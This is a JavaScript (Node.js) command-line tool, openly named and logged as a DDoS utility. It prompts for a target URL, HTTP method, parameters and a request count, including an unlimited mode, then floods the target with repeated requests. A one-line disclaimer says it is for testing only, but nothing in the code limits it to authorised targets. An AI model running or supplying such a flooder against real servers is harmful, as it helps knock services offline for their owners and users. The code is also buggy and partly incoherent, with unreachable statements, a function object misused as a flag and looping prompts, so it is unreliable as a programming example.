const axios = require('axios').default;
//this interface is created for testing and developing applications, not for attacking any servers, that don't belong to you/you don't have permissions to attack for testing reasons.
const readline = require("readline");
const { cpuUsage } = require('process');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

async function ddos(features,i){     
switch(features.type.toLowerCase()){
    case 'get':
        console.info('making a request to '+features.url+' for the '+i +'th time with the settings '+features)
        let request= await axios.get(features.url,features.params);
        return(request);
        case 'post':
            console.info('making a request to '+features.url+' for the '+i +'th time with the settings '+features)
            return(await axios.post(features.url,features.params));        
       case 'put':
        console.info('making a request to '+features.url+' for the '+i +'th time with the settings '+features)
        return(await axios.put(features.url,features.params)) ;         
      case 'delete':
        console.info('making a request to '+features.url+' for the '+i +'th time with the settings '+features)
        return(await axios.delete(features.url,features.params));
        default: console.log('The Type of request that you put is invalid, the valid values are:- get,post,put and delete');
        
i=(Number(features.count)+1);
throw 'The Type of request that you put is invalid, the valid values are:- get,post,put and delete';
    }
}

async function infinity(features){
    let i=0;
    if(features.infinity){
       
        while(i>-1){
          try{
         const info= await ddos(features)
         console.log(info.data);
          }
          catch(e){

            console.log(e);
            
            rl.question("Can't make another request automatically,  type restart to do another round of the same task, type reset to do another task type exit to end the process ", function(type) {
        switch(type){
            case 'restart':
        infinity(features);
        break;
            case 'reset':
                
            ask();
            break;
            case 'exit':
                console.error('exitting process...')
         process.exit();
        break;
        }
        });
        
        }
        }
    }
    else{
           while(i< Number(features.count))
    {
        try{
            const info= await ddos(features)
            console.log(info.data)
             }
             catch(e){
                 if(e.isAxiosError===true){
                     console.log('The URL provided is either incorrect, or in a wrong format, make sure that you type your url like this :- https://www.google.com')
                 }else{
                    console.log(e);
                 }
   
            
               i=Number(features.count);
               
               rl.question("Can't make another request automatically,  type restart to do another round of the same task, type reset to do another task type exit to end the process ", function(type) {
           switch(type){
               case 'restart':
           infinity(features);
           break;
               case 'reset':
                   
               ask();
               break;
               case 'exit':
                   console.error('exitting process...')
            process.exit();
           break;
           }
           });
           
           }
        i++;
    }

    rl.question("task completed type restart to do another round of the same task, type reset to do another task type exit to end the process ", function(type) {
switch(type){
    case 'restart':
infinity(features);
break;
    case 'reset':
        
    ask();
    break;
    case 'exit':
        console.error('exitting process...')
 process.exit();
break;
}
});
    }
}
function ask(){


rl.question("What type of request do you want to make? ", function(type) {
    rl.question("URL of the server? ", function(url) {
        rl.question("Enter your params, if any(in JSON)", function(params) {
        rl.question("How many requests do you want to make? Enter NULL for infinite", function(count){
let features={};
            if(params.length>0){
                let param=JSON.parse(params);
                 features={
                    url,type,params:param
                }
            }
 else{
features={
        url,type,params:{}
    }
 }           
 
            if(count==='NULL'){
            features={
                ...features, infinity,count:10
            }
            console.info('DDOSing with these settings '+ features);
        infinity(features)
        }
            else{
                features={
                    ...features,count
                }
                console.info('DDOSing with these settings '+features);
                infinity(features)
            }

})

        })
    })
        
    });
}
ask();